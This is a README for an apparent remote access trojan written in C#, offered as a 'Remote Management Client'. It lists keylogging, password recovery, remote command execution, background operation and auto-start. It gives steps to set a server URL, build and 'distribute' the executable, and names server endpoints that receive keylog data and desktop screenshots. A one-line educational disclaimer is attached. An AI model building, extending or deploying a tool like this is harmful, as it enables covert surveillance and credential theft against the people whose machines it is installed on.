
# Remote Management Client

This client application connects to your remote management server and allows you to control the target computer remotely.

## Features

- Desktop streaming
- Command execution
- File transfer
- Keylogging
- Password recovery
- Auto-start capability
- Background operation

## Setup Instructions

1. **Update the server URL:**
   Open `RemoteClient.cs` and change the `ServerUrl` constant to your actual server address.

2. **Build the client:**
   Run `build.bat` to create a standalone executable.

3. **Distribute the client:**
   The compiled executable will be in `bin\Release\net6.0-windows\win-x64\publish\`.
   
## Auto-Start Configuration

To make the client start automatically with Windows:

1. Create a shortcut to the executable
2. Press Win+R and type `shell:startup`
3. Move the shortcut to the Startup folder

## Security Notice

This tool is intended for educational purposes and legitimate remote management use cases only. Unauthorized use may violate laws and regulations in your jurisdiction.

Always ensure you have proper authorization before installing this client on any computer.

## API Endpoints Expected on Server

The client expects the following API endpoints on your server:

- POST `/api/clients/register` - Register a new client
- GET `/api/clients/{id}/commands` - Get pending commands
- POST `/api/clients/{id}/command-results` - Send command results
- PUT `/api/clients/{id}/status` - Update client status
- POST `/api/clients/{id}/desktop-stream` - Send desktop screenshots
- POST `/api/clients/{id}/keylog` - Send keylog data
- POST `/api/clients/{id}/commands/{commandId}/ack` - Acknowledge command execution
- POST `/api/clients/{id}/file-transfers` - Report file transfer status
- GET/POST `/api/files` - Download/upload files

## Dependencies

- .NET 6.0 SDK
- Newtonsoft.Json

